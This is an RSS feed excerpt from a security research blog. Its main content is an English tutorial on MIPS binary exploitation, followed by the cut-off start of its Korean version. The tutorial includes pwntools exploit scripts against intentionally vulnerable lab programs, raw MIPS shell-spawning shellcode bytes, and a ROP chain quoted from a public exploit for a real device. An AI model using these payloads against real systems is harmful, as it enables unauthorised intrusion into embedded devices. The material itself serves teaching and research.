&#xBC1C;&#xD45C;&#xC790;&#xB8CC;</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/cisco/">cisco</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/container-escape/">container escape</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-20281/">CVE-2025-20281</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-20337/">CVE-2025-20337</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/23/poosic/cve-2025-2028,1cve-2025-20337/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Exploitation basic in MIPS (EN)</title>
      <link>https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/en/</guid>
      <pubDate>Thu, 21 Aug 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I&amp;#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;&lt;img sr</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I&#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image1.jpg" alt="image1.jpg"></p><p>When you get into embedded hacking, you encounter binaries and environments from various RISC architectures.</p><p>Most of the time, you&#x2019;ll work with and see the ARM architecture. However, it&#x2019;s also not uncommon to come across MIPS and MIPSEL architectures&#x2026;</p><p>The assembly instructions and registers look unfamiliar from the start, and to top it off, you have to worry about the Cache&#x2026;</p><p>Let&#x2019;s cover the most fundamental aspects needed for exploitation in this somewhat alien MIPS environment!</p><h2 id="1-MIPS-vs-MIPSEL"><a href="#1-MIPS-vs-MIPSEL" class="headerlink" title="1. MIPS vs MIPSEL"></a>1. MIPS vs MIPSEL</h2><p><img src="image2.jpg" alt="image2.jpg"></p><p>MIPS is one of the RISC architectures designed so that registers and instructions perform a single role. Although it has the disadvantage of having many registers, its instructions are simple, leading to low power consumption, which is why it&#x2019;s primarily used in embedded devices.</p><p>Because the MIPS instruction set is so cleanly organized, it&#x2019;s often the architecture taught in university computer architecture courses (that was the case for me)&#x2026;</p><p>MIPS is big-endian, while MIPSEL is little-endian. MIPSEL only adopts the little-endian data storage format, so it operates in the same way as MIPS. Since the commonly used x86-64 architecture also uses this data storage method, you can use pwntools functions in the same way for MIPSEL. Therefore, in a MIPSEL environment, you can use pwntools&#x2019; <code>p32()</code> and <code>p64()</code> functions as they are!</p><h2 id="2-MIPS-Stack-amp-Register"><a href="#2-MIPS-Stack-amp-Register" class="headerlink" title="2. MIPS Stack &amp; Register"></a>2. MIPS Stack &amp; Register</h2><p>Before we dive into exploitation, it&#x2019;s necessary to understand the stack structure and behavior in a MIPS environment.</p><p>The official references for the MIPS architecture are <a href="https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf">MIPS32 Architecture For Programmers Volume I</a> and the <a href="https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf">MIPS Assembly Language Programmer&#x2019;s Guide</a>.</p><p>From these, let&#x2019;s cover the knowledge we need from an exploitation perspective. First, here is a list of registers used in MIPS and their roles.</p><div class="table-container"><table><thead><tr><th>&#xC774;&#xB984;</th><th>&#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC88;&#xD638;</th><th>&#xC5ED;&#xD560;</th></tr></thead><tbody><tr><td><strong><code>$zero</code></strong></td><td><strong><code>$0</code></strong></td><td>Always returns 0</td></tr><tr><td><strong><code>$at</code></strong></td><td><strong><code>$1</code></strong></td><td>Reserved for assembler to calculate pseudo-instructions</td></tr><tr><td><strong><code>$v0</code> ~ <code>$v1</code></strong></td><td><strong><code>$2</code> ~ <code>$3</code></strong></td><td>Stores values returned from functions</td></tr><tr><td><strong><code>$a0</code> ~ <code>$a3</code></strong></td><td><strong><code>$4</code> ~ <code>$7</code></strong></td><td>Stores function arguments</td></tr><tr><td><strong><code>$t0</code> ~ <code>$t7</code></strong></td><td><strong><code>$8</code> ~ <code>$15</code></strong></td><td>Used for temporary value storage by the assembler or language</td></tr><tr><td><strong><code>$s0</code> ~ <code>$s7</code></strong></td><td><strong><code>$16</code> ~ <code>$23</code></strong></td><td>Used to store long-lasting values (callee-saved)</td></tr><tr><td><strong><code>$t8</code> ~ <code>$t9</code></strong></td><td><strong><code>$24</code> ~ <code>$25</code></strong></td><td>Used for temporary value storage by the assembler or language</td></tr><tr><td><strong><code>$k0</code> ~ <code>$k1</code></strong></td><td><strong><code>$26</code> ~ <code>$27</code></strong></td><td>Reserved for the OS kernel</td></tr><tr><td><strong><code>$gp</code></strong></td><td><strong><code>$28</code></strong></td><td>Stores the value of the global pointer</td></tr><tr><td><strong><code>$sp</code></strong></td><td><strong><code>$29</code></strong></td><td>Stores the value of the stack pointer</td></tr><tr><td><strong><code>$fp</code>/<code>$s8</code></strong></td><td><strong><code>$30</code></strong></td><td>Stores the value of the frame pointer</td></tr><tr><td><strong><code>$ra</code></strong></td><td><strong><code>$31</code></strong></td><td>Stores the return address</td></tr></tbody></table></div><p>The registers to pay close attention to are <code>$ra</code>, <code>$sp</code>, and <code>$s8</code>.</p><p>In MIPS, the <code>$ra</code> register holds the function&#x2019;s return address. It&#x2019;s helpful to think of it as serving the role of <code>RET</code> in x86/x64.</p><pre><code class="hljs nasm">0x00400734 &lt;main+0&gt;:    addiu   sp,sp,-1360x00400738 &lt;main+4&gt;:    sw      ra,132(sp)0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)0x00400740 &lt;main+12&gt;:   move    s8,sp...0x004007d8 &lt;main+164&gt;:  move    sp,s80x004007dc &lt;main+168&gt;:  lw      ra,132(sp)0x004007e0 &lt;main+172&gt;:  lw      s8,128(sp)0x004007e4 &lt;main+176&gt;:  addiu   sp,sp,1360x004007e8 &lt;main+180&gt;:  jr      ra</code></pre><p>The structure works by saving the return address from the <code>$ra</code> register onto the stack during the function prologue and then jumping to the return address in the <code>$ra</code> register during the function epilogue.</p><p>The <code>$ra</code> register&#x2019;s value is saved to the stack relative to the <code>$sp</code> (current stack pointer) and <code>$s8</code> (frame pointer). Therefore, the first step in stack-based exploitation is to calculate the offset by determining the buffer&#x2019;s starting position and the return address&#x2019;s location relative to the <code>$sp</code> register.</p><pre><code class="hljs nasm">lw      $s2, 24(sp)      ; Load value at sp+24 into $s2 (address of &amp;&quot;/bin/sh&quot;)lw      $s1, 20(sp)      ; Load value at sp+20 into $s1 (address of &amp;system)lw      $s0, 16(sp)      ; Load value at sp+16 into $s0 (address of &amp;sleep)lw      $ra, 28(sp)      ; Load value at sp+28 into $ra (address of the next gadget)addiu   sp, sp, 32       ; Clean up the stack pointerjr      $ra              ; Jump to $ra (the next gadget)</code></pre><p>The gadget form needed for the Shellcode and ROP chains, which will be explained later, is shown above.</p><p>The most basic form involves loading values from the stack into the <code>$s0-$s7</code> registers using the <code>lw</code> instruction, cleaning up the stack pointer with <code>addiu</code>, and then jumping to the return address with <code>jr</code>.</p><p>Since this is the most basic form, you can combine the necessary arguments and instructions to fit the specific situation and environment.</p><pre><code class="hljs nasm">move    $t9, $s1         ; Move $s1 (system address) to $t9 (register for calls)jalr    $t9              ; Jump to the address in $t9</code></pre><p>Function execution is performed via the <code>jalr</code> instruction. You can understand it as working like the call instruction in x86-64.</p><h2 id="3-Cache-Incoherency"><a href="#3-Cache-Incoherency" class="headerlink" title="3. Cache Incoherency"></a>3. Cache Incoherency</h2><p>When exploiting a real device configured with a MIPS environment, you&#x2019;ll sometimes need to use shellcode due to the nature of IoT/embedded devices. However, there&#x2019;s a crucial point to be aware of when using shellcode in a MIPS environment.</p><p>That is the Cache.</p><p><img src="image3.png" alt="image3.png"></p><p>MIPS uses two types of caches: the Instruction Cache, which holds opcodes, and the Data Cache, which records data.</p><p>The problem, known as Cache Incoherency, occurs because the value we input (our shellcode) goes into the Data Cache, but the CPU tries to execute instructions from the existing Instruction Cache.</p><p>To solve this, we need to bring the data from the Data Cache to the Instruction Cache. This process, depending on the cache write policy, involves synchronizing with memory and then invalidating the Instruction Cache. The important part here is that we need to flush the Data Cache to force a cache write.</p><p><img src="image4.png" alt="image4.png"></p><p>The state of memory and the caches after the Data Cache has been flushed is shown above. Since the instructions in the Instruction Cache and memory are no longer identical, the Instruction Cache is invalidated. Then, the code from the Data Cache, now synchronized with memory, is executed.</p><p>Only by going through this process can we create a flow where the shellcode we&#x2019;ve inserted can actually be executed.</p><p><img src="image5.png" alt="image5.png"></p><p>The easiest way to achieve this is by calling the <code>sleep()</code> function.</p><p>When <code>sleep()</code> is called, execution is passed to another process or thread, causing other data to be generated in the Data Cache. Later, according to the cache write policy, a flush occurs, and the data residing in memory is also written to the Data Cache.</p><p>Therefore, if you&#x2019;re using shellcode in a MIPS environment, it&#x2019;s a good practice to structure your exploit by calling <code>sleep()</code>.</p><h2 id="4-MIPS-Exploit-Practice"><a href="#4-MIPS-Exploit-Practice" class="headerlink" title="4. MIPS Exploit Practice"></a>4. MIPS Exploit Practice</h2><p>Let&#x2019;s practice exploitation in a MIPS environment with a simple example.</p><h3 id="4-1-RTL"><a href="#4-1-RTL" class="headerlink" title="4-1: RTL"></a>4-1: RTL</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">target</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>{        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>We&#x2019;ll practice finding the stack offset using a basic RTL in a MIPS environment. This example code creates a vulnerable function where a buffer overflow occurs.</p><pre><code class="hljs nasm">0x00400738 &lt;main+4&gt;:    sw      ra,132(sp)  ; ret0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)0x00400740 &lt;main+12&gt;:  move  s8,sp...0x0040079c &lt;main+104&gt;:addiu  v0,s8,24  ; buf0x004007a0 &lt;main+108&gt;:move  a1,v0...0x004007b0 &lt;main+124&gt;:jalr  t9  ; scanf</code></pre><p>By checking the assembly with gdb, we can find the following offsets:</p><ul><li><p>Return address: sp + 132<br>We can see that the value in the $ra register, which holds the return address, is stored at sp+132.</p></li><li><p>Buffer start: sp + 24<br>We can see that the argument for scanf() involves the operation s8 + 24 (and s8 was set to sp).</p></li></ul><p>Therefore, the offset is 132 - 24 = 108.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)sh = <span class="hljs-number">0x4006e0</span>pay = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">108</span>pay += p32(sh)p.sendline(pay)p.interactive()</code></pre><p><img src="image6.png" alt="image6.png"></p><p>After writing the exploit code with the correct offset and running it, we can confirm that it works perfectly.</p><h3 id="4-2-shellcode"><a href="#4-2-shellcode" class="headerlink" title="4-2: shellcode"></a>4-2: shellcode</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);        sleep(<span class="hljs-number">1</span>);        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf: %p\n&quot;</span>, buf);        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>This is an example of using shellcode while considering the Cache Incoherency issue in MIPS that we discussed earlier. This is also a buffer overflow vulnerable code, built with NX disabled.</p><p>The return address offset is the same as in the previous problem.</p><p><img src="image7.png" alt="image7.png"></p><p>Additionally, I used an address within <code>__libc_csu_init</code> for the stack-cleaning gadget.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timep = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)sh = <span class="hljs-string">b&quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&quot;</span>sleep_addr = <span class="hljs-number">0x00400970</span>gadget = <span class="hljs-number">0x00400824</span>p.recvuntil(<span class="hljs-string">b&quot;buf: &quot;</span>)addr = int(p.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)log.success(<span class="hljs-string">&quot;addr is {}&quot;</span>.format(hex(addr)))pay = shpay += <span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">108</span> - len(sh))pay += p32(sleep_addr)pay += p32(gadget)pay += p32(addr)time.sleep(<span class="hljs-number">1</span>)p.sendline(pay)p.interactive()</code></pre><p><img src="image8.png" alt="image8.png"></p><p>The most basic approach is to call the <code>sleep()</code> function, followed by a stack-cleaning gadget, and then jump to the shellcode address. The shellcode is for MIPS.</p><p>In a real-world scenario, using shellcode would also require a libc base leak and gadget calls to invoke <code>sleep()</code>, which means you would be performing a ROP attack. You can refer to the link below!</p><p><a href="https://www.exploit-db.com/exploits/48994">https://www.exploit-db.com/exploits/48994</a></p><pre><code class="hljs python">First ROP (sleep_gadget): <span class="hljs-number">0x0004c974</span> + libc_base = <span class="hljs-number">0x2ab2e974</span><span class="hljs-number">0x0004c97c</span>      move    t9, s0<span class="hljs-number">0x0004c980</span>      lw      ra, (var_1ch)<span class="hljs-number">0x0004c984</span>      lw      s0, (var_18h)<span class="hljs-number">0x0004c988</span>      addiu   a0, zero, <span class="hljs-number">2</span> ; arg1<span class="hljs-number">0x0004c98c</span>      addiu   a1, zero, <span class="hljs-number">1</span> ; arg2<span class="hljs-number">0x0004c990</span>      move    a2, zero<span class="hljs-number">0x0004c994</span>      jr      t9Second ROP (stack_gadget): <span class="hljs-number">0x00039fa8</span> + libc_base = <span class="hljs-number">0x2ab1bfa8</span><span class="hljs-number">0x00039fa8</span>      addiu   s0, sp, <span class="hljs-number">0x28</span><span class="hljs-number">0x00039fac</span>      move    a0, s3<span class="hljs-number">0x00039fb0</span>      move    a1, s0<span class="hljs-number">0x00039fb4</span>      move    t9, s1<span class="hljs-number">0x00039fb8</span>      jalr    t9Third ROP (call_gadget): <span class="hljs-number">0x000406d8</span> + libc_base = <span class="hljs-number">0x2ab226d8</span><span class="hljs-number">0x000406d8</span>      move    t9, s0<span class="hljs-number">0x000406dc</span>      jalr    t9payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">160</span> + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode</code></pre><p>Here are the ROP gadgets and payload section used in that link.</p><p>The first gadget is for setting up the arguments needed to use <code>sleep()</code>. The use of <code>zero</code> instead of <code>0</code> to initialize a register to zero is another characteristic feature of MIPS!</p><p>The second gadget is a stack-cleaning gadget, which can be easily found in functions like <code>__libc_csu_init</code>, as introduced in our earlier exercise.</p><p>Finally, you can see how a ROP chain is constructed along with a function call gadget.</p><p>Finally, for those who find it a bit difficult to practice in a MIPS environment and want to study with CTF problems, you can refer to the challenges below!</p><ul><li><strong>Hack.lu 2019 - no_risc_no_future</strong></li><li><strong>HackCTF - BabyMIPS</strong></li></ul><p>RISC architectures like MIPS are unfamiliar at first, but once you get used to the exploitation tips and tricks specific to the architecture&#x2019;s characteristics, they seem quite manageable! I hope this has been of some help to those who are new to MIPS exploitation!</p><p>I&#x2019;ll be back with another embedded topic next time! Thank you! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/MIPS/">MIPS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Exploitation basic in MIPS (KO)</title>
      <link>https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/ko/</guid>
      <pubDate>Thu, 21 Aug 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image1.jpg" alt="image1.jpg"></p><p>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB2E4; &#xBCF4;&#xBA74;, &#xB2E4;&#xC591;&#xD55C; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; &#xD658;&#xACBD;&#xC744; &#xB9CC;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xBD80;&#xBD84; ARM &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC811;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; MIPS, MIPSEL &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xC5ED;&#xC2DC; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xAC8C; &#xB9C8;&#xC8FC;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><p>&#xC5B4;&#xC148; &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xC0DD;&#xAE34; &#xAC83;&#xBD80;&#xD130; &#xB0AF;&#xC124;&#xACE0;, &#xAC8C;&#xB2E4;&#xAC00; Cache &#xB54C;&#xBB38;&#xC5D0; &#xACE0;&#xB824;&#xD560; &#xAC83;&#xAE4C;&#xC9C0;&#x2026;</p><p>&#xB2E4;&#xC18C; &#xC774;&#xC9C8;&#xC801;&#xC778; &#xC774; MIPS&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBD80;&#xBD84;&#xC744; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-MIPS-vs-MIPSEL"><a href="#1-MIPS-vs-MIPSEL" class="headerlink" title="1. MIPS vs MIPSEL"></a>1. MIPS vs MIPSEL</h2><p><img src="image2.jpg" alt="image2.jpg"></p><p>MIPS&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBA85;&#xB839;&#xC774; &#xD558;&#xB098;&#xC758; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xC911;&#xC5D0; &#xD558;&#xB098; &#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xB9CE;&#xC544;&#xC9C4;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xC774; &#xC788;&#xC9C0;&#xB9CC;, &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xADF8;&#xB85C; &#xC778;&#xD574; &#xC804;&#xB825; &#xC18C;&#xBAA8;&#xAC00; &#xC801;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>MIPS&#xB294; &#xBA85;&#xB839;&#xC5B4; &#xC138;&#xD2B8;&#xAC00; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB300;&#xD559; &#xCEF4;&#xD4E8;&#xD130; &#xAD6C;&#xC870; &#xB54C; &#xAC00;&#xB974;&#xCE58;&#xB294; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xAC00; MIPS&#xC778; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;(&#xC800;&#xB3C4; &#xADF8;&#xB7AC;&#xC2B5;&#xB2C8;&#xB2E4;)&#x2026;</p><p>MIPS&#xB294; &#xBE45;&#xC5D4;&#xB514;&#xC548;, MIPSEL&#xC740; &#xB9AC;&#xD2C0;&#xC5D4;&#xB514;&#xC548;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. MIPSEL&#xC740; &#xB370;&#xC774;&#xD130; &#xC800;&#xC7A5; &#xBC29;&#xC2DD;&#xB9CC; &#xB9AC;&#xD2C0;&#xC5D4;&#xB514;&#xC548;&#xC73C;&#xB85C; &#xCC44;&#xD0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, MIPS&#xC640; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874;&#xC5D0; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; x86-64 &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0;&#xC11C;&#xB3C4; &#xB370;&#xC774;&#xD130; &#xC800;&#xC7A5; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, MIPSEL&#xB3C4; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; pwntools &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, MIPSEL &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; pwntools&#xC758; <code>p32()</code>, <code>p64()</code>&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><h2 id="2-MIPS-Stack-amp-Register"><a href="#2-MIPS-Stack-amp-Register" class="headerlink" title="2. MIPS Stack &amp; Register"></a>2. MIPS Stack &amp; Register</h2><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC55E;&#xC11C; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD; &#xAD6C;&#xC131;&#xACFC; &#xB3D9;&#xC791;&#xC744; &#xC774;&#xD574;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>MIPS &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC758; &#xACF5;&#xC2DD; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xB294; <a href="https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf">MIPS32 Architecture For Programmers Volume I</a>&#xACFC; <a href="https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf">MIPS Assembly Language Programmer&#x2019;s Guide</a> &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC911; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xC9C0;&#xC2DD;&#xC744; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120;, MIPS&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBAA9;&#xB85D;&#xACFC; &#xC5ED;&#xD560;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>&#xC774;&#xB984;</th><th>&#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC88;&#xD638;</th><th>&#xC5ED;&#xD560;</th></tr></thead><tbody><tr><td><strong><code>$zero</code></strong></td><td><strong><code>$0</code></strong></td><td>0&#xC744; &#xCD9C;&#xB825;</td></tr><tr><td><strong><code>$at</code></strong></td><td><strong><code>$1</code></strong></td><td>&#xC758;&#xC0AC; &#xBA85;&#xB839;&#xC5B4; &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xB97C; &#xC704;&#xD574; &#xC608;&#xC57D;</td></tr><tr><td><strong><code>$v0</code> ~ <code>$v1</code></strong></td><td><strong><code>$2</code> ~ <code>$3</code></strong></td><td>&#xD568;&#xC218;&#xB85C;&#xBD80;&#xD130; &#xBC18;&#xD658; &#xB41C; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td></tr><tr><td><strong><code>$a0</code> ~ <code>$a3</code></strong></td><td><strong><code>$4</code> ~ <code>$7</code></strong></td><td>&#xD568;&#xC218; &#xC778;&#xC218; &#xC800;&#xC7A5;</td></tr><tr><td><strong><code>$t0</code> ~ <code>$t7</code></strong></td><td><strong><code>$8</code> ~ <code>$15</code></strong></td><td>&#xC5B4;&#xC148;&#xBE14;&#xB7EC;&#xB098; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xC784;&#xC2DC; &#xC800;&#xC7A5; &#xC2DC; &#xC0AC;&#xC6A9;</td></tr><tr><td><strong><code>$s0</code> ~ <code>$s7</code></strong></td><td><strong><code>$16</code> ~ <code>$23</code></strong></td><td>&#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xC9C0;&#xC18D;&#xB418;&#xB294; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;</td></tr><tr><td><strong><code>$t8</code> ~ <code>$t9</code></strong></td><td><strong><code>$24</code> ~ <code>$25</code></strong></td><td>&#xC5B4;&#xC148;&#xBE14;&#xB7EC;&#xB098; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xC784;&#xC2DC;&#xB85C; &#xC800;&#xC7A5;</td></tr><tr><td><strong><code>$k0</code> ~ <code>$k1</code></strong></td><td><strong><code>$26</code> ~ <code>$27</code></strong></td><td>OS &#xCEE4;&#xB110;&#xC744; &#xC704;&#xD574; 